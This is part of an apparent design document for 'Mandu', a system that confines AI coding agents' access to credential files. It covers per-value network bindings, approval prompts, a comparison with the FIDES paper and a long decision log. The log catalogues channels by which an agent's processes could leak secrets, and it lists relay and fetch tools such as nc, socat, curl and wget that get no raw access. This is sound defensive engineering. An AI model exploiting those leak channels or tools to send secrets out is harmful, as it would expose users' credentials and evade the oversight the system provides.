### 5.1 Four levels of effort

| Layer | What the user does | What it sets | Split |
|---|---|---|---|
| **0. Nothing** | install | the built-in catalog of credential files at `no-model`, no bindings, no openers | — |
| **1. Mark** | the dashboard's file explorer (Rules › Files and folders), or Apply on a Plan 14 suggestion (`mandu policy suggest`, or the explorer's Suggested view). A `mandu protect <path> --level <level>` verb for terminal users was proposed here and is **not built** | a level on a path | a tightening (any client) |
| **2. Answer** | resolve an Inbox row: *Allow once*, *This session* or *Always* | one binding or one opener, for the scope chosen | a relaxation (the human) |
| **3. Write** | edit `policy.yaml`, or the dashboard's editor | everything, `output:` and per-value bindings included | a relaxing edit is held as a proposal (`policy-surface.md §8`) |

### 5.2 The file

The names stay (`paths`, `level`, `bindings`, `readers`, `others`); two
things change. A reader entry carries its own `output:` (D3, built), and a
structured file may bind each value separately (`values:`, built
2026-10-11).

```yaml
paths:
  - path: ~/proj/deploy.token
    level: no-model                  # no AI model may read it
    bindings: [db.internal:5432]     # where its value may be sent
    readers:
      - app: deploy                  # may open it raw (pinned by path + hash on first use)
        prints: nothing              # the human's word: deploy is not vetted (D8 (12))
        output: clear                # deploy prints its status, not this file

  - path: ~/ws/app/.env
    level: no-model
    readers:
      - app: python3                 # an interpreter is a reader only with its script pinned
        script: /opt/tools/deploy.py
    values:                          # per value, for a structured file
      STRIPE_KEY: { bindings: [api.stripe.com] }
      "AWS_*":    { bindings: ["*.amazonaws.com"] }

  - path: ~/contracts/**
    level: any-model                 # the AI may read these when it asks (logged)
    bindings: [smtp.gmail.com]
```

- **`values:`** keys are the field names of the structured twin (the names
  the symbols carry, `$MDU:nomodel_Read[…].STRIPE_KEY`), with `*` globs. A
  value without an entry takes the file's `bindings`; a value's symbol is
  released at that value's bindings. A holder that opened the file raw holds
  every value, so its label is the intersection over the values: the D1 rule
  inside one file.

  *Built 2026-10-11* (`arbiter/policy/value-bindings.ts`). The decisions
  the bullet left open, each taken in the fail-closed direction:

  - **Matching.** `*` matches any run of characters; a key also names the
    sub-fields of the value it names (`DATABASE_URL` covers
    `DATABASE_URL.password`, `STRIPE_KEY` the file's own spelling
    `STRIPE_KEY.encoded`). Case-sensitive. Several entries naming one value:
    the value goes only where ALL of them allow (the intersection; a more
    specific key never widens a broader one).
  - **The whole file** is the intersection of the file's own `bindings` and
    EVERY entry's, whether or not an entry matches a value the file has
    today (a value added later is covered; an entry that matches nothing
    only narrows). The resolver answers this as the label's `bindings`
    (`LabelDecision.bindings`, `path-labels.ts`), with the declared ones
    beside it (`fileBindings`, `values`), so every caller that treats the
    file as one datum (a raw holder, a copy by reference, the whole-file
    symbol, an upload, a session's in-context read) gets the narrow answer
    without knowing about values. Only one place widens past it: a
    registered FIELD row (`current-bindings.ts` rule 1,
    `declaredBindingsReader`).
  - **A field row's values** are read back from its own base row with the
    extractor that minted it: the span's key plus the keys of every secret
    merged into that span (`SecretSpan.parts`), so a symbol holding two
    values goes only where both may. A field whose names cannot be read
    back (no base row, the text no longer parses to it) takes the whole
    file's.
  - **The raw holder** (`taintedProcessBindings`) and a copy's sources
    (`label-lookup.ts` `byReference`) count a file's registry rows beyond
    its label, for the hosts Mandu adds on its own (a wire grant, an auth
    grant); under `values:` a field row also carries its value's hosts, so
    every host the label declares anywhere is left out of that share
    (`holderFileBindings`; a wire host a value also names is dropped too).
    No derived file takes `values:` from an ancestor or a pattern: a copy
    (its sources known) is one datum at its sources' intersection, and a
    file a high session wrote (sources unknown) may hold any secret the
    session read in any field, so it keeps only the whole file's bindings.
    Only an exact human label on the file itself applies `values:` to it.
  - **The fingerprint tripwire** still judges the whole-file row at the
    whole file's hosts: a raw value seen verbatim on the wire with no
    placeholder, even at its own value's host, may trip it (only a holder
    or a leak puts raw bytes there, and a holder is refused first).
  - **The policy surface.** The validator refuses a non-mapping, an empty
    one, a key with a space or a control character, an entry other than
    `{ bindings: [...] }`; `values:` is accepted at every level (under
    `public` it decides nothing), so the dashboard's label menu never drops
    it. `policyDelta`: a binding added to a value, a key added, a key
    removed (its values fall back to the file's, which may be wider) are
    relaxations; bindings that only shrink under the same keys are a
    tightening; `values:` dropped by a lock becoming plain strict is a
    tightening; a new lock carrying `values:` is not plain strict.
    `relaxationsOf` lists each bound value. `lock-path` keeps `values:` as
    it keeps `readers`, `others` and `extract`; a reader pin that gives a
    file its own entry copies the label's declared `bindings` and
    `values:`, never the whole-file intersection.
  - **Read back.** `pathLevels`, `whyPath` (`mandu why <file>`: one line per
    value, then the whole file) and the policy snapshot carry `values`; the
    Rules page shows the second menu as *Per value*, read only, with the
    sentence of §5.3 (`dashboard.md` §4.25p).

  Tests: `arbiter/test/unit/per-value-bindings.test.ts` (the rules, the
  validator, the compiler and resolver, a copy, `policyDelta`, `lock-path`,
  the registry rows and the egress gate per value, the fail-closed field,
  a raw holder over IPC), `tests/stack/per-value-bindings.test.ts` (the
  real arbiter and net-proxy: STRIPE_KEY released at api.stripe.com and
  the AWS keys not, the AWS key at amazonaws.com and the Stripe key not,
  the whole file at neither; a raw holder refused at both with a control
  holder let through; a value's binding added on approval),
  `dashboard/test/unit/view-model/per-value-words.test.ts`,
  `home-js-explorer.test.ts` ("§4.25p per value"), and the launcher's
  `why.test.ts`.
- **`readers:`** entries are a name or `{ app, output?, mask?, path?,
  sha256?, from?, script?, scriptSha256? }`; the pinning fields keep their
  Plan 10 meaning, and D8's rules decide which entries admit anything. The
  global `apps:` table is **deprecated**: it clears nothing (D3).
- **Dropped**: `stores:` and a separate `declassify:` (§4.10).
- **The validator, the loader and `policyDelta`** know the reader object's
  `output:` and `script:`, and `values:` (a relaxation when it adds a
  binding, built 2026-10-11).

### 5.3 What the user reads back

Every rule is shown as sentences generated from the label, in the product's
closed vocabulary (`dashboard.md` §4.25d), never as the lattice:

> **~/ws/app/.env** — No AI model may read it. `python3` running
> `/opt/tools/deploy.py` may open it. `STRIPE_KEY` may be sent only to
> api.stripe.com; `AWS_*` only to \*.amazonaws.com; a program holding the
> whole file may send it nowhere without asking. Copies made from it follow
> the same rules.

The Rules page is to get two read-only views of one relation: **per file**
(who may see it: models, openers, destinations) and **per principal** (what
`psql` may open, what may reach `api.stripe.com`, which models see anything
raw). Figure 7 is the second view for the example. **Built** (2026-10-11):
the per-file view, as a Rules row's two menus (which AI may read it, where
it may be sent) and its read-only "Opens it" line (`dashboard.md` §4.25p);
and the per-principal view, the Rules page's read-only card "Who may get
your secrets" with a tab per program, host and AI (`dashboard.md` §4.25aa,
`GET /api/policy/by-who`). Both read each reader entry through one
judgment (`pathOpeners`), so they cannot disagree. Not covered by the
per-principal view: the built-in protections and the human's answers; per
value when `values:` lands.

### 5.4 An approval

```
python3 (tool call "npm run deploy") wants to send data from ~/ws/app/.env
and data/customers.csv to hooks.slack.com.
  .env may go to: api.stripe.com, *.amazonaws.com (per value)
  customers.csv may go to: nowhere
  [Deny]   [Allow once]   [Allow this session]   [Always: add hooks.slack.com to .env] [… to customers.csv]
```

The row names every source the holder holds, so the intersection is visible
rather than a surprise, and names the source that blocks. *Always* is one per
source (§9 R2), each its own human-plane edit; the send proceeds when every
source allows it.

*Built (2026-10-11)*, at the net-proxy's legs (plain HTTP, the inspected
HTTPS leg, a blind tunnel); `arbiter/policy/holder-send-ask.ts` has the
rules, `dashboard.md` §4.34 "A send names every file" the card.

- **The ask.** Before, a holder's send to an unbound host was refused with
  no Inbox row at all (the 403's reason said "approval required", and
  nothing could be approved). Now the proxy, having refused, asks
  `taintedProcessBindings` once more naming the destination, on the human
  socket: the arbiter consults the human's answer for the row
  `holder-send:{session, the files held}` × host (and spends a once), or
  files that row. From the data socket the destination is ignored (no
  verdict read, no row: an attested report, §3 D9). The row's key carries
  the files, so it survives a restart and one set of files is one question.
- **The answers.** *Allow once* lets the next send go (a blind tunnel keeps
  the answered file set for its life, so its chunks are not asked again; a
  holder holding more is a new question). *Allow this session* is a
  standing verdict on the row, whose key names the session (a row with no
  session keeps it as once). *Block* stands. These are verdicts on the row;
  *Always* is not.
- **One *Always* per source.** At list time the arbiter attaches every file
  the holder holds as it stands now (`holderSources`, the same composition
  `taintedProcessBindings` counts by): its bindings, whether it blocks
  (`bindingCovers`, the one binding rule the proxy matches by, confidentiality.md §2.2), and whether its rule can
  take the host. An *Always* is the edit `holderSourceBinding` describes, a
  `lock-path` on THAT file's rule (its exact rule in policy.yaml, its level,
  readers, `others` and `extract` kept; else a new exact rule for the file
  alone at the level and bindings that apply now), which the arbiter previews
  and refuses if any relaxation names another rule; the dashboard applies it
  as the Rules page does (`applyAsHuman`: preview with that relaxation
  expected, `policyPropose` and `resolvePolicyProposal` on the admin channel).
  Never a verdict: a binding the human removes later takes the release away
  again. The row stays pending, naming the files left, until no file blocks;
  then the law answers it and the listing retires it (`retireMootQuestions`).
- **A copy** (§4.6) whose sources are known is named by its sources, each
  with `via: <copy>`, and its *Always* binds at the source, never at the
  copy. A folder rule over the copy, a source that no longer classifies
  secret, a cycle or a chain too deep take none (the card says why). A copy
  of unknown origin is an ordinary file bound nowhere: its *Always* writes an
  exact rule on the copy with this host, the human's act on that copy (the
  ledger's residual of §4.6).
- **No *Always* (the card says why):** a folder rule with readers, `others`
  or `extract` (an exact rule would drop them for this file); a `mandu.db`
  rule from the Rules page that outranks policy.yaml; a name that reads as a
  pattern; a rule with `values:` (§5.2, 2026-10-11: the whole file may go
  only where every value may, so a host added to the file's own bindings
  would reach only the values with no entry and the send would stay
  refused; the card says to add the host under `values:`). A file with
  `values:` is listed with the whole file's bindings, the intersection over
  its values, never its field rows' per-value hosts (`holderFileBindings`).
- **Left:** the guard's direct connect (`tainted_connect_refusal`) still
  refuses without a row; the row names the holder's program generically
  ("the agent's program"), not `python3 (tool call "npm run deploy")`; an
  *Always* per value on a file with `values:` (§5.2; the file takes none
  today).

Tests: `arbiter/test/unit/holder-send-ask.test.ts` (the key, the matcher,
which files block, a copy by its sources, where an *Always* writes and when
it is refused; over IPC: the ask on the human socket and never the data
socket, *Allow once* and *this session*, one source answered still refuses,
the question retired when both are, `policy.yaml` gains the host in exactly
the two rules); `interceptors/net-proxy/test/unit/egress.test.ts` (the ask,
a denial, a tunnel's granted set); dashboard `holder-send-asks.test.ts`,
`home-js-holder-send.test.ts`, `always-source-route.test.ts`; stack
`tests/stack/approval-always-per-source.test.ts` (the net-proxy's verdict
and the dashboard over their production adapters: one question naming both
files, *Allow once* over the real route, *Always* on one file leaves the
send refused and the card naming the other, *Always* on both releases it,
the file has the host in exactly those two rules).

### 5.5 What each level allows under this model

| Action | `public` | `any-model` | `local-model` | `no-model` |
|---|---|---|---|---|
| **1. Agent reads** | raw | symbol; rung 2 helper; rung 3 shrinks the session label | symbol; a declared local model only | symbol, always |
| **2. Program opens** | raw | openers raw (their holder now holds the file); others twin or `EACCES` | same | same |
| **3. Network** | allowed | a destination in `Label(holder)`, checked on every leg (direct, proxied HTTP, HTTPS, tunnel), at the later event; else ask | same | same |
| **4. Write back** | allowed | the file refers to its sources; a synced folder is a destination | same | same |
| **Pipeline `A \| B`** | n/a | the call's tree is one holder at the model exit; the taint follows each pipe, socket and shared file at the network and write exits | same | same |

## 6. Relation to FIDES, and what is ours

Checked against the paper (Costa et al., "Securing AI Agents with
Information-Flow Control", [arXiv:2505.23643](https://arxiv.org/abs/2505.23643)).
`confidentiality.md` §13.2 already places Mandu beside FIDES; this section
states what §4 takes from it. APPA ([arXiv:2607.24625](https://arxiv.org/abs/2607.24625),
a readers × trust product lattice) and FLOWSEAL
([arXiv:2609.14003](https://arxiv.org/abs/2609.14003), a confidentiality
monitor as a tool-level interceptor) are the two other neighbours.

### 6.1 What FIDES already has

- **The lattice of §4.2.** FIDES's confidentiality label is the set of
  authorized readers, joined by intersection; integrity is {trusted,
  untrusted}; the two form a product lattice. §4.2 is that lattice (and before
  it the decentralized label model of Myers and Liskov, and Denning's 1976
  lattice model), instantiated with a different set of principals.
- **The intersection answer.** FIDES's Permitted Flow policy (P-F) checks
  every egress tool call: all recipients must be authorized readers of the
  data. D1 violated the join FIDES states; its fix aligns Mandu with FIDES.
- **The floating context label and hidden values.** FIDES labels the
  planner's context with the join of its history (our session watermark) and
  keeps values more restrictive than the context in variables outside the
  conversation (our symbols).
- **Type-based declassification.** A quarantined result constrained to `bool`
  or an `enum` carries its low capacity in its label, so policies may accept
  a one-bit flow while refusing a string.

### 6.2 What FIDES does not cover

FIDES's scope is the planner's conversation and variable store. Against the
four actions of §1:

| Case | FIDES | Mandu |
|---|---|---|
| 1. agent reads | the models are not principals in the policy; the quarantined model reads raw data, so the provider sees everything | models are sinks, separated by location (`no-model`, `local-model`) |
| 2. program reads | tools are readers at the tool-call boundary; no subprocesses, no program identity | pinned executables as openers, process holders, lineage |
| 3. network | P-F on egress tool arguments | checked at `connect()` and at the proxy, AF_UNIX included, for any process |
| 4. write back | no filesystem or cross-session labels | derived labels on written files, by reference |
| pipeline | not modeled | taint along descriptors and file objects (§4.5.1); the call tree at the model exit |

FIDES computes labels exactly because every flow passes its runtime as a
variable. Mandu infers flows from OS events (open, exec, fork, connect,
accept, pass, wait), and D2, D4, D5, D6 and D7 were all places where that
inference was wrong. FIDES never faces them.

### 6.3 Contributions, ranked

1. **Soundness of the OS-level approximation (not yet proven).** The claim
   to prove and test: *for every byte crossing a trapped exit through an
   explicit flow the OS shows (open, exec, fork, pipe, socket, shared file,
   write, wait), the label Mandu checks is at least as restrictive as the
   label FIDES's semantics would assign*, within the boundary of §4.9. That
   needs the OS events that define the join written down and a test per
   event class; §3 and §4.5.1 now have a test per class they fixed, but no
   proof exists and no live drill yet uses `readers:` across two files, a
   pipeline and a redirect together. No work in the FIDES line has this.
2. **The model provider as a sink, separated by location.** Already claimed
   in `confidentiality.md` §13.3 item 2. In FIDES the models sit in the
   trusted base by assumption. Reader-set principals may be anything in
   principle, so the novelty is the instantiation and its enforcement: under
   `no-model` no vendor model sees the bytes, the quarantined one included.
3. **Heterogeneous sinks on unmodified agents.** Models, endpoints, synced
   folders and files in one label, with pinned programs as openers, enforced
   without host root under Claude Code and Codex. Processes carrying labels
   with trusted declassifiers is textbook OS-level information-flow control
   (Flume, HiStar); the claim is the locus and the principal set (Plan 10
   §10), not the mechanism.
4. **A symbol instead of a denial for a non-reader model (modest).** FIDES's
   hidden variables are close. What is ours is the dual view (the human sees
   originals) and the release at an OS egress point.

**Not claimed:** the reader-set lattice, intersection as join, the
watermark, declassification in general.

### 6.4 One thing to borrow

Mandu always re-symbolizes a quarantined result at the source's level. FIDES's
type lattice would let `inspect_symbol` return a `bool` or a closed `enum`
("does this contract mention X?") into the main context under a label that
records its capacity, a bounded leak of a few bits per call. That is a real
usability gain for `any-model` and `local-model` rung 2; for `no-model` it
does not apply (the helper never reads the data). Not built.

## 7. Build order

Steps 1 to 6 fixed shipped behavior, each with its unit and e2e tests; steps 7
to 13 change the policy surface or the product.

1. **Tests first, for D1, D2, D4, D5, D6 and D7**, each failing on the code
   before its fix. *Done.*
2. **Correct the documents the defects falsified** (§3's opening). *Done.*
3. **Fix D6** (§3 D6). *Done.*
4. **Fix D1** at both sites, per file (§3 D1, §9 R3). *Done;* per value
   with `values:` (step 9), *done* 2026-10-11.
5. **Fix D4's leak** (§3 D4). *Done;* the label by reference in step 9.
6. **The call tree and the later-event check** (§3 D7, §4.5, §4.5.1).
   *Done,* as the guard's `/proc` chain at every exec and open, the call-root
   recorder, and the taint-time sweep in place of a per-holder sink table.
7. **The prompt scan** (§4.8). *Superseded by Plan 15* (its §11, phase 1).
8. **D8 and D9** (§3 D8, §3 D9): verdicts by binary and hash, out-of-reach
   pins, the loader environment, trusted `from:`, the script pin, decisions
   (b) and (c), code by argument, printers admit nothing (fetchers and
   copies of a host printer by hash included; moot questions retired), the
   call signature's quoting, authenticated reports. *Done,* `git` as a
   printer included (2026-10-04, §4.9).
9. **The policy surface (§5.2):** `output:` on the reader entry, the label
   by reference and `values:` (2026-10-11) *done*; the Inbox's *This
   session* scope left.
10. **The dashboard (§5.3, §5.4):** the sentences, the per-principal view,
    the approval row naming every source with one *Always* per source (§9
    R2), the session's label on the product page (§9 R3). The per-file
    menus and the per-principal view *done* (2026-10-11, `dashboard.md`
    §4.25p, §4.25aa); the approval row naming every source *done*
    (2026-10-11, §5.4); the full sentences and the session's label left.
11. **`confidentiality.md` §13:** the generalized label is FIDES's reader
    lattice on the destinations and a total order on the models (§4.3); the
    contribution is the sink set plus the soundness of the approximation
    (§6.3).
12. **Synced folders as destinations** (§4.6). Left. Its neighbours of §9 R4
    (b) are *done* (2026-10-03): network and FUSE mounts as destinations,
    a holder's files closed to other local users, device nodes, and the
    display socket confirmed a destination (§4.6, §4.9); and their three
    leftovers (2026-10-04): an overlay judged by its upper layer, a
    holder's names and attributes on such a mount, a writable descriptor of
    one or of a device passed to a holder.
13. **Optional:** typed quarantined results (§6.4), with its own decision
    note.

## 8. Decisions recorded here

| Date | Decision and reason | Section |
|---|---|---|
| 2026-09-28 | Labels are sets of sinks, joined by intersection; the four levels are named points on the model column | §4.2 |
| 2026-09-30 | Programs are openers, not sinks; the travelling label names sinks only (the OS layer cannot see which program in a tree holds the bytes) | §4.1, §4.2 |
| 2026-09-30 | The axis stays a total order on the models; only destinations are set-valued | §4.3 |
| 2026-09-30 | The flow check runs at the later of the source and the sink event | §4.5 |
| 2026-09-30 | A derived file refers to its sources' labels; openers are not inherited | §4.6 |
| 2026-09-30 | `stores:` is dropped; synced folders are destinations | §4.6 |
| 2026-09-30 | Approvals default to once; *Always* is a human-plane relaxation | §4.7 |
| 2026-09-30 | The output rule is keyed by (file, program), on the reader entry | §4.2, §5.2 |
| 2026-09-28 → 2026-10-02 | The prompt: first scanned for registered values and shapes, then registered values only (no masking by shape, Plan 14 §1), then superseded by Plan 15: trusted by default, the registered-value filter on by default, other filters opt-in | §4.8, Plan 15 §2 |
| 2026-10-02 | D2: the taint follows a pipe, a FIFO or an unnamed socket pair from writer to reader (at the taint and at the reader's later event), never to the agent; the writers' taint is unioned without a parent edge. Chosen over the call tree as one holder (taints `a; b`, misses processes outside the call) and over refusing pipes (breaks `cat .env \| grep`) | §4.5.1 |
| 2026-10-02 | D3: the output rule is the reader entry's on one file, read per taint row and folded strictest; the program-wide `apps:` is deprecated and clears nothing. Reading `apps:` as "files the program is a listed reader of" was rejected: it keeps D3's own leak | §3 D3, §5.2 |
| 2026-10-02 | D4: the guard pulls the derived labels (fail-closed for a file changed in the session); a holder of every source reads a copy raw with no new taint row | §3 D4 |
| 2026-10-07 | D4, the copy's values: the holder's raw read registers the copy at its sources' bindings; a copy over the piece bound is not read raw. Chosen over registering at the write (the guard reports a write's open, not its bytes, and the copy is often written in many calls) and over leaving the copy's own values unknown (a derived session token reached the model when printed again). Cost: every copy a holder reads back is a registered value, its long lines included (plan 10 §11.18) | §3 D4 |
| 2026-10-04 | A twin's size by its path, in the guard-only posture: the guard also answers an `lstat` relative to the cwd or absolute with the twin's metadata (`LstatTrap::Cwd`), so a reader that sizes its read by `lstat` (`git diff --no-index`, `git grep --no-index`, found by the git-as-a-printer test, where the twin printed cut mid-placeholder) reads the twin whole, and no stat by path but the fts form tells a non-reader the secret file's real size. Chosen over trapping every `lstat` (`find` 5.8×), over leaving it (every such reader sees a broken twin) and over padding the twin to the real size (a placeholder is often longer than its value, and the real size would stay visible). Cost, in that posture only: about 10 µs per tracked file on `git status` (14.5 → 46 ms on 3,000 files), about 20 µs a file on `ls -l`; `MANDU_NET_GUARD_LSTAT_TWINS=0` opts out (`confidentiality.md` §7.2a) | §4.9 |
| 2026-10-04 | D4, the twin's identity: a derived twin's descriptor is placed at 768 or above and its descriptor stats report the derived file's `st_dev`/`st_ino` (the twin's size), so a reader that checks the descriptor against the path (Claude Code's Bash task file) accepts the twin. Chosen over serving the agent its own call's output file raw (the bytes would sit in the agent outside the call's fold: a later `Read`, a background task's notice), over rewriting the file in place with its twin (a holder may still append to it, and the human's copy is lost), and over trapping every `lstat` or `fstat` (`lstat` cost 60 % on `git status`). Cost: a seccomp round trip for a descriptor stat on a number at or above 768 | §3 D4 |
| 2026-10-04 | D4, a holder's working-directory file: a derived file holding only the canonical path of an existing directory twins as its own text, with no symbol. Chosen over a content rule without the existing-directory test (a holder's text that merely looks like a path), over the shell's working directory at its taint (still leaks the exit status: `pwd` runs only after `&&`, and needs a per-process record) and over keeping the symbol (Claude Code loses the directory of every tainted call). Cost: the names channel of §4.9 reaches the agent's working directory without an `ls` | §3 D4, §4.9 |
| 2026-10-02 | The label by reference, evaluated at each lookup in one composition; a source no longer secret counts as bound nowhere (stricter than "its last label", which needs a snapshot); unknown sources, a cycle or a chain deeper than eight stay bound nowhere | §4.6 |
| 2026-10-02 | D7: lineage as the guard's live `/proc` chain at every exec and secret open, first edge wins; a call bound to the agent's own shell by the proxy-recorded command within its window; several matches folded; an unbound call masked at the session's level while the session holds a raw read; more same-text calls than shells binds none. Chosen over an env or cgroup marker per call (the agent does not cooperate; rewriting the command would change what it runs) and over the most-recent-exec guess | §3 D7 |
| 2026-10-02 | D7, the orphan subshell: the orphan root's tree is folded into every call relayed no later than it was first seen. Chosen over a fork trap (the wrap forbids one), a session id (a reusable pid) and masking the whole session | §3 D7 |
| 2026-10-02 | R5 and decision (b): an interpreter is a reader only as a pinned script every R5 check passes; an entry naming a code-running program alone admits nothing; such an opener is never prompted for. Chosen over "any out-of-reach isolated script" (a system REPL runs what the agent feeds it) and over asking (the code is unseen); the validator warns so an older law still loads | §3 D8, §9 R5 |
| 2026-10-02 | Decision (c): `open:` and `write:` verdicts name an interpreter's script; one with no pinnable script gets none (an open refused, a write asked per run). Chosen over refusing such writes (a shell appending to `~/.bashrc` for the human has no script) and over hashing the command line (code can read more code) | §3 D8, write-protection.md §2.1 |
| 2026-10-02 | Code by argument: a reader handed code by its command line or environment is no reader and never asked about, judged per program by allowlist; editors, debuggers and tracers run code. Chosen over listing git and ssh as code-running (they are default readers of credentials and keys) | §3 D8 |
| 2026-10-02 | D9: the guard's and the proxies' records are believed only on the human-plane socket; from the data socket they are claims that may add taint. Chosen over a reporter token (a claim race, and the same channel). A call is bound by the command the proxy recorded at relay, never by the agent's echo | §3 D9 |
| 2026-10-02 | While a launch whose agent can reach the human-plane socket is live (no guard and no wrap), no report on that socket is believed either; an unwalled protecting launch the arbiter cannot record refuses unless `--best-effort` | arbiter-human-plane.md §10.1 |
| 2026-10-02 | D7, background polls: Codex's `write_stdin` takes the process leg of the `exec_command` that started that session; `TaskOutput` joins `BashOutput` as a mapped shell no exec binds | Plan 10 §11.12 |
| 2026-10-02 | §9 R1, socket shapes: a channel joined after a holder's taint (an accept, an `SCM_RIGHTS` pass) makes the other side a holder or is refused; every flow is recorded at the arbiter for the model exit. Chosen over refusing a holder's local accepts and passes (breaks a dev server's clients, Node's cluster) and over a per-chunk check (`read`/`write` are not trapped) | §4.5.1 |
| 2026-10-02 | The agent's own connection to a holder is masked at the model exit, not refused: refusing breaks every HTTP MCP server that reads a secret, and making the agent a holder refuses its connections | §4.5.1 |
| 2026-10-02 | §9 R1, file shapes: the taint follows a file object or shared memory from a holder that can write it to every reader in the tree; a holder's message-queue send is refused (no receive-side point) | §4.5.1 |
| 2026-10-02 | The agent receipt's leftovers: a holder's connection held by the session's net-proxy is refused (the proxy pools connections, so no record names the receiver); the old-kernel connect is recorded; a FIFO or file the agent reads while a holder writes it is an agent flow on a file channel. A holder's FIFO read only outside the tree, and its signal with a payload to a non-holder, are refused; a signal's number is not followed | §4.5.1, §4.9 |
| 2026-10-03 | `CLONE_PARENT` and `clone3` are refused for the whole tree under a secret policy, so every process a holder starts is its child. Chosen over a fork trap (breaks the wrap) and a per-holder filter (cannot be added from outside). Cost: runc's `nsexec` fails in the agent's tree | §3 D7 |
| 2026-10-03 | §9 R4, the exit status: a masked result carries `is_error: false` and a kept Codex header is blanked (exit code, token count, wall time); the parent and tracer of a holder are made holders at its taint, and a waiter that may reap a holder is made one at `wait4` / `waitid`; `PIDFD_GET_INFO` answers `ENOTTY`. Chosen over the wait trap alone (a blocking wait judged before its child read misses a later `siginfo`). Cost: the model cannot tell a masked command failed; from a holder child's taint on, the call's shell is a holder | §4.9, §9 R4, `exec-routing.md` §7.5 |
| 2026-10-03 | Codex's masked results register their value but not the runtime's own head lines, so later results repeating them stay raw | Plan 10 §11.14 |
| 2026-10-05 | An OpenCode `read` masked whole registers the text of the file's lines, not OpenCode's frame (`<path>`, gutters, `(End of file - total N lines)`), so a later read of any one-line file stays raw; a value already registered still masks wherever it reappears, across sessions | Plan 10 §11.16 |
| 2026-10-03 | The names gap of §4.9 is accepted; instead printers admit nothing in any form, never prompted for, no past answer counting. Chosen over registering every name a holder creates (each new metadata exit reopens it) and over vetting a printer's downstream (the agent's code). Fail-closed: a program that can print a file when asked is listed | §3 D8, §4.9 |
| 2026-10-03 | (3a) the code-running list is matched under distribution prefixes and by uutils' directory, and includes the multi-call binaries and relays (`nc`, `socat`); (3b) the ssh-agent socket admits no printer, relay or code-running program. One table in the arbiter with parity-tested copies, over a guard-only list | §3 D8 |
| 2026-10-03 | D7, the signature's quoting (D8 leftover (5)): a shell `-c` payload is tokenized once, as the shell already unquoted it, and the signature writes the words back in one canonical quoting, injective on the tokenizer's word lists. Chosen over the space-joined words (a payload in one more pair of quotes, a different command, bound a call whose own shell record was lost, and its result reached the model raw) and over comparing the raw payload text (the exec gate compares a leaf argv with the model's text, which only a tokenized form matches). Gain: a Codex, OpenCode or OpenClaw call whose command starts and ends with the same quote binds to its shell instead of being masked; cost: an exec-escalation *Always* for a command with a quoted multi-word argument is asked again once | §3 D7 |
| 2026-10-03 | The !437 leftovers (1), (2) and (4), fail-closed and simple. (1) a program that fetches or transfers a URL or a file, a local one included, is a printer (`curl`, `wget`, httpie, `scp`, `rclone`, the text browsers, …), in the four copies of the list; a consumer-table printer still gets the wire release's twin. (2) a binary byte-identical to a printer installed on the host is that printer under any name (`printer-hashes.ts`, `hashPrints`). (4) a pending Inbox question about a printer or an interpreter alone, which no answer can make take effect, is retired: removed from the store at start and before every listing and answer, an answer to it refused with the reason; ids never reused (`egress_approvals_seq`). Removal chosen over a terminal status (a status every reader of `status` would have to know, for a row no one may see). `git`, which can print a file too, is not made a printer: an open residual with options (§4.9). Cost: those fetchers as a file's reader give no raw byte (`curl --netrc` and `wget` without the wire release get `.netrc`'s twin); a renamed copy of a host printer reads nothing; the tests build their own raw holder | §3 D8, §4.9 |
| 2026-10-03 | §9 R4 (b), the exits that are paths, fail-closed and simple. (1) A network or FUSE mount (by `fstatfs` magic or `mountinfo` type, on the guard's descriptor; unreadable counts as remote) is the destination `mount:<fstype>:<source>`: a holder's write-open or create there is refused unless every datum it holds is bound to it (equality), judged before the create; a process already writing there is refused the raw open. (2) Another local user: the guard creates a holder's files with no group or other bits and strips them from an existing one (through the descriptor it holds, before the holder gets it; at the taint for a file held before); a mode it cannot narrow refuses; a `chmod` or POSIX ACL that would reopen a derived file is refused under every secret policy. Chosen over the arbiter `chmod`ing by path at the label (a rename races it; a create would exist wider first). Human-labelled files keep their mode. (3) The display server needs no new rule: its socket is a Unix destination a holder reaches only when bound (pinned by a test). (4) A holder writes to no device but the terminal and the sinks that keep nothing (by device number); no binding admits one. Cost: a holder writes nothing on NFS or sshfs until bound; every file a holder writes is `0600`/`0700`; a holder cannot drive a serial port, a printer or `/dev/fuse` | §4.6, §4.9, §9 R4 |
| 2026-10-04 | §9 R4 (b)'s three leftovers, fail-closed and simple. (i) A stacking file system is judged where its writes land: an overlay by `upperdir=`, eCryptfs and shiftfs by their source, resolved in the guard's and the tracee's view, any remote ⇒ remote (named by that mount); no upper ⇒ no write; not found, relative, or aufs ⇒ remote (`mount:<fstype>:<source>` of the stack). (ii) The name family (`mkdir`, `rename`, `link`, `symlink`, `mknod`, `unlink`, `truncate`, `chmod`, `setxattr`, a holder's `bind`) is trapped under every secret policy, performed for a holder on the pinned directory or file, and that mount judged first (both sides of a rename or link). (iii) A writable descriptor of a file on such a mount or of a non-sink device passed to a holder over `SCM_RIGHTS` refuses the send (judged at the sender, which the guard already performs, over a `recvmsg` trap on the hot path of every receiver); held or queued at the taint, the sweep refuses the raw open; in a network namespace the guard cannot see into, the pass is refused. Lookups, read offsets, `utimensat` and `chown` there are left as metadata channels. Cost: a holder cannot `mkdir`, `mv` or `rm` on an unbound mount; a container root on an overlay whose upper the container cannot see is remote until bound; every name-family call pays a seccomp round trip (answered at once for a non-holder) | §4.6, §4.9, §9 R4 |
| 2026-10-04 | The taint-time sweep judges and narrows a held descriptor on a `pidfd_getfd` copy of it, not by its `/proc/<pid>/fd` link looked up again (a number closed and reused between the look and the `chmod` named another file: a protected file of a concurrent kernel test went `0600`), and a mapped file only while its path still names it (refused otherwise). Chosen over re-checking the link before the `chmod` (still a window). Cost: one descriptor copy per writable descriptor at a taint; a shared writable mapping whose path was renamed onto refuses the raw open | §4.6 |
| 2026-10-03 | (8) The renamed-copy fix's leftovers: an interpreter no hash knows is recognized by its content in the guard (`runs:<family>`, the interpreter's own front end: `Py_BytesMain`, `node::Start`, `perl_parse`, …), treated as an `args:` finding; the ssh-agent socket's readers are judged by the arbiter's identity (`readerProgram`: name and host hash), no answer refusing; the dashboard shows the arbiter's per-entry judgment (`readersAdmitNothing`, `readersPrint`, `readersCopyOf`). Chosen over sonames (a static build has none) and embedding symbols (vim, gdb, nmap carry them), and over a guard-side host scan. Cost: such a build reads nothing raw; programs embedding a front end are no readers; the ssh-agent is refused while the arbiter is down. Not covered: interpreters no marker names (ksh, fish, bun, deno, …) and launchers or printers not byte-identical to installed ones | §3 D8 |
